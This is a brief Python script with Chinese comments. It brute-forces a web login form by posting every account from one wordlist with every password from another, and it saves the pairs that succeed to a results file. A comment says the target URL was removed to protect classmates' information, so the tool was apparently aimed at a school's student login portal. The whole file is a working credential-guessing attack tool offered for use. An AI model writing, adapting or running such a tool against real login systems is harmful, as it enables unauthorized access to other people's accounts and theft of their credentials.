import requests
from bs4 import BeautifulSoup
import re

url=''                  #为了同学信息安全，上传版本的链接已移除

def TryLogin(account,password):
    params={'IDToken1':'','IDToken2':''}
    params['IDToken1']=account
    params['IDToken2'] =password
    r=requests.post(url,data=params)
    bsObj=BeautifulSoup(r.text,"html.parser")
    FeedBack=bsObj.find("title")
    if re.search('Please',FeedBack.get_text()):
        print('Success with:',params['IDToken1'],'and',params['IDToken2'])
        f=open('result.txt','a')
        f.write(params['IDToken1']+' '+params['IDToken2']+'\n')
        f.close()
    #else:
        #print('failed')
#print(FeedBack.get_text())

f1=open('IDToken1.txt')
count=0
for line1 in f1.readlines():
    account = line1.strip('\n')  # 调用strip()删除行尾空格
    f2 = open('IDToken2.txt')
    for line2 in f2.readlines():
        password=line2.strip('\n')
        #print(account)
        TryLogin(account,password)
        count+=1
        if count%100==0:
            print(count)
        #print(password)
    f2.close()
f1.close()